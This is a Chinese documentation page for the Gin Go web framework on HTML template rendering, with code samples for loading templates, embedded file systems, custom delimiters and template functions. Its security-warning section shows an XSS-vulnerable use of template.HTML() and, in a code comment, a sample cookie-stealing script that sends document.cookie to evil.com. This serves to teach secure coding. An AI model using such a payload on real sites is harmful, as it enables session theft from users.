---
title: "HTML 渲染"
sidebar:
  order: 9
---

Gin 使用 [html/template](https://pkg.go.dev/html/template) 包进行 HTML 渲染。
有关如何使用它们的更多信息（包括可用的占位符），请参阅 [text/template](https://pkg.go.dev/text/template) 的文档。

使用 LoadHTMLGlob() 或 LoadHTMLFiles() 来选择要加载的 HTML 文件。

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

在不同目录中使用同名模板

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**注意：** 请将你的 HTML 模板包装在 `{{define <template-path>}} {{end}}` 块中，并使用相对路径 `<template-path>` 定义你的模板文件。否则，GIN 将无法正确解析模板文件。

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### 从 http.FileSystem 加载模板（v1.11+）

如果你的模板是嵌入的或由 `http.FileSystem` 提供的，请使用 `LoadHTMLFS`：

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### 安全警告：`template.HTML()` 绕过自动转义

Go 的 `html/template` 包会自动转义插入模板中的值以防止跨站脚本（XSS）攻击。但是，当你将字符串转换为 `template.HTML()` 时，你显式绕过了这种保护。如果字符串包含用户提供的输入，攻击者可以注入任意 JavaScript。

**不安全——永远不要对用户输入使用 `template.HTML()`：**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**安全——让模板引擎自动转义用户输入：**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

只在你完全控制的内容上使用 `template.HTML()`，例如在你自己代码中定义的静态 HTML 片段。永远不要将其用于来自用户输入、用户填充的数据库字段或任何其他不受信任来源的值。

### 自定义模板渲染器

你也可以使用自己的 HTML 模板渲染器

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### 自定义分隔符

你可以使用自定义分隔符

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### 自定义模板函数

查看详细[示例代码](https://github.com/gin-gonic/examples/tree/master/template)。

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

结果：

```sh
Date: 2017/07/01
```
